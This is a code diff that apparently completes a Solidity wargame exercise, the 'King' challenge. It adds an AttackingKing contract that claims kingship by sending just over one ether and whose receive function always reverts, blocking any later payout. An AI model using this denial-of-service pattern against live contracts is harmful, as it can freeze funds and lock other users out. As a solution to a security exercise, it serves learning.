@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./King.sol";
-import "hardhat/console.sol";
 
 contract AttackingKing {
     address public contractAddress;
@@ -11,6 +10,11 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        King king = King(payable(contractAddress));
+        address(king).call{value: 1000000000000000001 wei}("");
+    }
+
+    receive() external payable {
+        revert();
     }
 }
